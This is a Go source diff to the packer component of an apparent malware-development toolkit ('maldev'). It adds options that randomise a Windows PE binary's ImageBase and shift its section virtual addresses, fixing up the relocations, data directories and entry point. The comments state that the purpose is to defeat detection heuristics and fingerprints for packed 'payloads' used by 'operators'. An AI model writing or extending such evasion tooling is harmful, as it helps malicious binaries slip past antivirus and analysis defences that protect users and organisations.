@@ -11,9 +11,11 @@
 package packer
 
 import (
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"math/rand"
+	"strings"
 	"time"
 
 	"github.com/oioio-space/maldev/crypto"
@@ -243,6 +245,52 @@ type PackBinaryOptions struct {
 	// PE only.
 	RandomizePEFileOrder bool
 
+	// **EXPERIMENTAL** — not in RandomizeAll fan-out.
+	// RandomizeImageBase, when true, overwrites the PE32+ Optional
+	// Header's ImageBase (uint64 at +0x18) with a fresh random
+	// value drawn from the canonical user-mode EXE range
+	// `[0x140000000, 0x7FF000000000)` snapped to 64 KiB. Under
+	// ASLR (which Go binaries enable by default via DYNAMIC_BASE),
+	// the loader picks the actual load address regardless of this
+	// value — so the only observable effect is a different
+	// preferred-base byte sequence in the file image. Defeats
+	// heuristics on canonical preferred-base values like the Go
+	// linker's 0x140000000 default ("file's ImageBase = 0x140000000
+	// → likely Go binary").
+	//
+	// Phase 2-F-3-c (lite) of docs/refactor-2026-doc/packer-design.md.
+	// PE only.
+	RandomizeImageBase bool
+
+	// **EXPERIMENTAL** — not in RandomizeAll fan-out. Requires the
+	// directory walker suite (Phase 2-F-3-c-2 onward) before it
+	// works on PEs with non-trivial imports / exception data.
+	// RandomizeImageVAShift, when true, shifts every section's
+	// VirtualAddress forward by a random delta D = N×SectionAlignment
+	// (N drawn from [1, 8] per pack, so D ∈ [4 KiB, 32 KiB] for the
+	// PE32+ default 4 KiB SectionAlignment). The shift fixes up the
+	// reloc table's absolute pointer values + each block's PageRVA,
+	// every non-zero DataDirectory entry's RVA, the OEP, and
+	// SizeOfImage. Section data is NOT moved — only metadata.
+	//
+	// Inter-section deltas are preserved, so RIP-relative
+	// references between sections (which the linker bakes as raw
+	// 32-bit displacements outside the reloc table) keep working
+	// without re-encoding. This includes the SGN stub's reach into
+	// .text, the central reason this transform exists in this
+	// shape rather than per-section permutation.
+	//
+	// Defeats heuristics anchored at canonical VAs (".text starts
+	// at VA 0x1000", "OEP is at 0x140001000"). Returns
+	// [transform.ErrRelocsStripped] when the input PE has the
+	// IMAGE_FILE_RELOCS_STRIPPED Characteristics bit set — such
+	// images carry no relocation metadata and can't be safely
+	// shifted; opt out for those binaries.
+	//
+	// Phase 2-F-3-c of docs/refactor-2026-doc/packer-design.md.
+	// PE only.
+	RandomizeImageVAShift bool
+
 	// RandomizeAll, when true, ORs every individual Randomize*
 	// flag above to true: stub section name, TimeDateStamp,
 	// LinkerVersion, ImageVersion, existing section names. The
@@ -297,6 +345,14 @@ func PackBinary(input []byte, opts PackBinaryOptions) ([]byte, []byte, error) {
 		opts.RandomizeExistingSectionNames = true
 		opts.RandomizeJunkSections = true
 		opts.RandomizePEFileOrder = true
+		// NOTE: RandomizeImageBase + RandomizeImageVAShift are
+		// intentionally NOT in the fan-out (Phase 2-F-3-c
+		// experimental). Both can crash certain payloads:
+		// VA shift lacks the per-directory internal-RVA walker
+		// suite (see Phase 2-F-3-c-* in the design doc); ImageBase
+		// rando interacts poorly with some loader paths despite
+		// the DYNAMIC_BASE guard. Operators can still opt in
+		// explicitly per payload.
 	}
 
 	// Resolve the master seed once. When opts.Seed==0 and any
@@ -309,7 +365,8 @@ func PackBinary(input []byte, opts PackBinaryOptions) ([]byte, []byte, error) {
 	anyRandomize := opts.RandomizeStubSectionName || opts.RandomizeTimestamp ||
 		opts.RandomizeLinkerVersion || opts.RandomizeImageVersion ||
 		opts.RandomizeExistingSectionNames || opts.RandomizeJunkSections ||
-		opts.RandomizePEFileOrder
+		opts.RandomizePEFileOrder || opts.RandomizeImageBase ||
+		opts.RandomizeImageVAShift
 	if anyRandomize && masterSeed == 0 {
 		s, err := random.Int64()
 		if err != nil {
@@ -428,6 +485,52 @@ func PackBinary(input []byte, opts PackBinaryOptions) ([]byte, []byte, error) {
 		out = newOut
 	}
 
+	// Phase 2-F-3-c (lite): randomise the PE32+ ImageBase field.
+	// Under ASLR this changes only the preferred-base bytes in
+	// the file image — runtime mapping is loader-decided. Cheap
+	// way to defeat fingerprints on the standard 0x140000000
+	// Go-linker default.
+	if opts.RandomizeImageBase && isPE {
+		rng := rand.New(rand.NewSource(masterSeed + seedOffsetImageBase))
+		base := transform.RandomImageBase64(rng)
+		// PatchPEImageBase rejects PEs without DYNAMIC_BASE
+		// (would crash the loader). Quietly skip rather than
+		// fail the whole pack — operators expect RandomizeAll
+		// to be best-effort across heterogeneous payloads.
+		if perr := transform.PatchPEImageBase(out, base); perr != nil &&
+			!strings.Contains(perr.Error(), "DYNAMIC_BASE") {
+			return nil, nil, fmt.Errorf("packer: patch image base: %w", perr)
+		}
+	}
+
+	// Phase 2-F-3-c: shift the entire image's VA layout forward
+	// by a random delta. Inter-section deltas preserved (so
+	// RIP-relative refs survive without disassembly + re-encoding);
+	// only the reloc table, DataDirectory, OEP, and SizeOfImage
+	// are touched.
+	if opts.RandomizeImageVAShift && isPE {
+		rng := rand.New(rand.NewSource(masterSeed + seedOffsetImageVAShift))
+		// Per-pack delta drawn from [1, 8] strides of SectionAlignment.
+		// Need to peek the alignment from the buffer; PE32+ default
+		// is 0x1000 which gives ranges [4 KiB, 32 KiB] — enough to
+		// move every VA off canonical addresses without risking
+		// uint32 overflow on small ImageBase fixtures.
+		strides := uint32(1 + rng.Intn(8))
+		// Read SectionAlignment from the optional header without a
+		// full parsePELayout call (we already trust isPE). Locate the
+		// PE header via e_lfanew.
+		peOff := binary.LittleEndian.Uint32(out[transform.PEELfanewOffset:])
+		coffOff := peOff + transform.PESignatureSize
+		optOff := coffOff + transform.PECOFFHdrSize
+		sectionAlign := binary.LittleEndian.Uint32(out[optOff+transform.OptSectionAlignOffset:])
+		delta := strides * sectionAlign
+		newOut, perr := transform.ShiftImageVA(out, delta)
+		if perr != nil {
+			return nil, nil, fmt.Errorf("packer: shift image VA by 0x%x: %w", delta, perr)
+		}
+		out = newOut
+	}
+
 	return out, key, nil
 }
 
@@ -443,6 +546,8 @@ const (
 	seedOffsetExistingSectionNames  int64 = 3
 	seedOffsetJunkSections          int64 = 4
 	seedOffsetPEFileOrder           int64 = 5
+	seedOffsetImageVAShift          int64 = 6
+	seedOffsetImageBase             int64 = 7
 )
 
 // transformFormatFor maps the operator-facing packer.Format to the
